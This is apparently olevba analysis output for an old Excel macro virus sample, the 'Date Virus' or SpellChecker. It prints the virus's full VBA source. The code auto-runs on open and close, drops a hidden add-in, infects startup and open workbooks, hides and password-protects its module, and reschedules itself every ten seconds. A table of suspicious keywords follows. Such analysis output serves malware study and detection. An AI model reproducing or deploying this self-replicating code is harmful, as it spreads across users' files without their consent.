olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.SpellChecker-3b48037248c4a442471ef9c90a3a6e60a8b4bd90
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO MSExcel.bas 
in file: Virus.MSExcel.SpellChecker-3b48037248c4a442471ef9c90a3a6e60a8b4bd90 - OLE stream: '_VBA_PROJECT_CUR/VBA/MSExcel'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

' Date Virus.
' Created: May 1, 1996.
'
' NOTE:
' The Date Virus was inspired by the Laroux virus.  While this particular
' macro virus is harmless, others are not!  This macro virus was developed
' to bring attention to the possible threat in the hopes that antivirus software
' will be developed to protect this application.

Public NextSchedule
Public Running

Function HasAddIn() As Boolean
Attribute HasAddIn.VB_ProcData.VB_Invoke_Func = " \n14"
    HasAddIn = False
    For Each prog In AddIns
        If prog.Name = "SPELLCK.XLA" Then HasAddIn = True: Exit For
    Next
End Function

Sub Auto_Close()
Attribute Auto_Close.VB_ProcData.VB_Invoke_Func = " \n14"
    If (ThisWorkbook.Name = "SPELLCK.XLA") Then Exit Sub
    If Running = False Then Exit Sub

    For Each book In Workbooks
       If book.Name <> ThisWorkbook.Name Then
          For Each modul In book.Modules
             If modul.Name = "MSExcel" Then
                Application.OnTime Now, book.Name & "!MSExcel.RepeatInfect"
             End If
          Next
       End If
    Next

    Application.OnTime NextSchedule, ThisWorkbook.Name & "!MSExcel.RepeatInfect", , False
    Application.DisplayAlerts = False
    ThisWorkbook.Close
End Sub

Sub Auto_Open()
Attribute Auto_Open.VB_ProcData.VB_Invoke_Func = " \n14"
    Dim fname As String
    Dim WB, WS As String
        
    If (ThisWorkbook.Name = "SPELLCK.XLA") Then Payload
    
    Counter = 0: AppInfected = False: WB = WS = ""
    
    On Error Resume Next
    WS = ActiveSheet.Name
    WB = ActiveWorkbook.Name
    On Error GoTo GotError

    ' don't want to leave the Mac users out of the fun!
    If (Left(Application.OperatingSystem, 3) = "Mac") Then
        fname = CurDir() & Application.PathSeperator & "SPELLCK.XLA"
    Else
        fname = "C:\SPELLCK.XLA"
    End If
    
    If (Dir(fname) = "") Then
       ThisWorkbook.Activate
       ThisWorkbook.Title = "Spell Checker"
       addinfname = "VBA.MAKE.ADDIN(""" & fname & """)"
       ExecuteExcel4Macro addinfname
       On Error Resume Next
       Workbooks(WB).Activate
       Worksheets(WS).Activate
       On Error GoTo GotError
    End If

    If HasAddIn = True Then
       If (AddIns("Spell Checker").Installed = False) Then AddIns("Spell Checker").Installed = True
    Else
       AddIns.Add(fname, False).Installed = True
    End If
    
    For Each book In Workbooks
       If book.Name <> ThisWorkbook.Name Then
          For Each modul In book.Modules
             If modul.Name = "MSExcel" Then
                Running = False
                Exit Sub
             End If
          Next
       End If
    Next

    ' attempt to infect the user's startup files.
    If (Left(Application.OperatingSystem, 3) = "Mac") Then
       StartFile = Dir(Application.StartupPath, MacID("XCEL"))
    Else
       StartFile = Dir(Application.StartupPath & Application.PathSeparator & "*.XLS")
    End If
    If ((StartFile <> "") And (StartFile <> ThisWorkbook.Name)) Then
       On Error Resume Next
       Workbooks.Open(Application.StartupPath & Application.PathSeparator & StartFile).Activate
       Infect
       ActiveWorkbook.Save
       ActiveWorkbook.Close
       Workbooks(WB).Activate
       Worksheets(WS).Activate
       On Error GoTo GotError
    End If
    If (Left(Application.OperatingSystem, 3) = "Mac") Then
       StartFile = Dir(Application.AltStartupPath, MacID("XCEL"))
    Else
       StartFile = Dir(Application.AltStartupPath & Application.PathSeparator & "*.XLS")
    End If
    If ((StartFile <> "") And (StartFile <> ThisWorkbook.Name)) Then
       On Error Resume Next
       Workbooks.Open(Application.AltStartupPath & Application.PathSeparator & StartFile).Activate
       Infect
       ActiveWorkbook.Save
       ActiveWorkbook.Close
       Workbooks(WB).Activate
       Worksheets(WS).Activate
       On Error GoTo GotError
    End If

GotError:
   RepeatInfect
End Sub

Function RepeatInfect()
Attribute RepeatInfect.VB_ProcData.VB_Invoke_Func = " \n14"
    Running = True
    On Error GoTo GotError
    
    NextSchedule = Now + TimeValue("00:00:10")
    Application.OnTime NextSchedule, ThisWorkbook.Name & "!MSExcel.RepeatInfect"
    Infect

    Exit Function

GotError:
End Function

Function Infect()
Attribute Infect.VB_ProcData.VB_Invoke_Func = " \n14"
    Dim WB, WS As String
    Dim Uninfected As Boolean
    
    On Error Resume Next
    WB = ActiveWorkbook.Name
    WS = ActiveSheet.Name
   
    For Each book In Workbooks
       Uninfected = True
       If book.Name <> ThisWorkbook.Name Then
          For Each modul In book.Modules
             If modul.Name = "MSExcel" Then
                Uninfected = False
             End If
          Next
          If Uninfected Then
             ThisWorkbook.Activate
             ThisWorkbook.Modules("MSExcel").Copy after:=book.Worksheets(book.Worksheets.Count)
             book.Title = "Spell Checker"
             book.Modules("MSExcel").Visible = False
             book.Modules("MSExcel").Protect password:=Date$
             
             ' return the user to the previously active window.
             Workbooks(WB).Activate
             Worksheets(WS).Activate
             book.Save 'save the worksheet to complete infection.
          End If
       End If
    Next
End Function

Function Payload()
Attribute Payload.VB_ProcData.VB_Invoke_Func = " \n14"
    Application.OnTime Now + TimeValue("00:03:00"), "SPELLCK.XLA!Payload"
    MsgBox "Just in case you didn't know, the current date is: " & Chr(13) & Chr(13) & Now & Chr(13) & Chr(13) & "Thank you for using Microsoft Excel!"
End Function
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - Visual Basic module, hidden -  MSExce
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|AutoExec  |Auto_Close          |Runs when the Excel Workbook is closed       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Application.AltStart|May change which directory contains files to |
|          |upPath              |open at startup                              |
|Suspicious|ExecuteExcel4Macro  |May run an Excel 4 Macro (aka XLM/XLF) from  |
|          |                    |VBA                                          |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Base64    |\!                  |XCEL                                         |
|String    |                    |                                             |
+----------+--------------------+---------------------------------------------+

